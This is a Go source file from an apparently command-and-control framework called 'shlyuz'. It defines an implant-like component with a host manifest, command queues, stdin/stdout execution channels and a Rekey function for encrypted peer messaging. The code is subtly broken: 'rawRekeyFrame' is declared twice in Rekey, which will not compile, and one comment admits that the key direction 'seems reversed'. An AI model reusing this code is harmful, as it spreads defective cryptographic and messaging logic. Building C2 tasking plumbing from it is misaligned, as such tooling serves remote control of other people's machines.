package component

import (
	"bytes"
	"encoding/json"
	"log" // Added import

	"shlyuz/pkg/config"
	routine "shlyuz/pkg/crypto"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/instructions"
)

type Component struct {
	// logger             log.Logger
	ConfigFile         string
	ConfigKey          []byte
	Config             config.ShlyuzConfig
	ComponentId        string
	Manifest           ComponentManifest
	InitalKeypair      asymmetric.AsymmetricKeyPair
	InitalRemotePubkey asymmetric.PublicKey
	CurrentKeypair     asymmetric.AsymmetricKeyPair
	CmdProcessingQueue []byte
	CmdDoneQueue       []byte
	TransportChannel   chan []byte
}

type ComponentExecutionChannel struct {
	CmdId  string
	StdOut chan string
	StdErr chan string
	StdIn  chan string
	Pid    chan int
}

type ComponentManifest struct {
	Id       string
	Os       string
	Hostname string
	Arch     string
}

type Command struct {
	Type string
	Args string
}

func Rekey(frame instructions.Transaction, component Component) (Component, []byte, asymmetric.AsymmetricKeyPair) {
	rawRekeyFrame := instructions.CreateInstructionFrame(frame, true)
	// The Rekey function prepares a message that, when sent and processed by a peer,
	// should result in this component and the peer agreeing on a new key for this component.
	// The message will advertise newComponentKeypair.PubKey.
	// This component will use its component.CurrentKeypair.PrivKey for this message's authenticity.
	// The peer will encrypt this message to component.Config.CryptoConfig.PeerPk. (This seems reversed, should be peer's receiving key)
	// The caller is responsible for updating component.CurrentKeypair to newComponentKeypair after successful transmission and acknowledgement.

	// Generate the new keypair that this component will use for receiving messages after this Rekey operation.
	newComponentKeypair, err := asymmetric.GenerateKeypair()
	if err != nil {
		log.Println("CRITICAL: Failed to generate new keypair in Rekey. Rekeying cannot proceed for this attempt. Error:", err)
		// Return the original component state and the original keypair to indicate failure to rekey.
		return component, nil, component.CurrentKeypair
	}

	// Prepare the instruction frame for the Rekey message.
	// Set its Pk field to the new public key being advertised.
	rawRekeyFrame := instructions.CreateInstructionFrame(frame, true) // frame contains Cmd, ComponentId, etc.
	rawRekeyFrame.Pk = newComponentKeypair.PubKey
	
	marshaledFrameBytes := new(bytes.Buffer)
	json.NewEncoder(marshaledFrameBytes).Encode(rawRekeyFrame)

	// Prepare the transmit frame using:
	// - The peer's public key (component.Config.CryptoConfig.PeerPk) to encrypt the message payload.
	// - This component's *current* private key (component.CurrentKeypair.PrivKey) for signing/authentication.
	rekeyFrame := routine.PrepareTransmitFrame(marshaledFrameBytes.Bytes(), component.Config.CryptoConfig.PeerPk, component.CurrentKeypair.PrivKey, component.Config.CryptoConfig.XorKey)
	
	// Return the original component, the prepared frame, and the new keypair.
	// The caller should handle sending the frame and then updating the component's CurrentKeypair to newComponentKeypair.
	return component, rekeyFrame, newComponentKeypair
}

// func GetCmd(frame instructions.Transaction, component Component) (Component, bool) {

// }

// func SendOutput(component Component, event instructions.EventHist) instructions.Transaction {
// 	var outputArgs instructions.CmdOutput
// 	var OutputTransaction instructions.Transaction
// 	OutputTransaction.Cmd = "fcmd"
// 	OutputTransaction.ComponentId = component.ComponentId
// 	outputArgs.Ipk = component.CurrentKeypair.PubKey
// 	outputArgs.EventHistory = event
// 	rawOutputArgs := new(bytes.Buffer)
// 	json.NewEncoder(rawOutputArgs).Encode(outputArgs)
// 	OutputTransaction.Arg = rawOutputArgs.Bytes()
// 	return OutputTransaction
// }

func AckCmd(frame instructions.Transaction, component Component) bool {
	return true
}
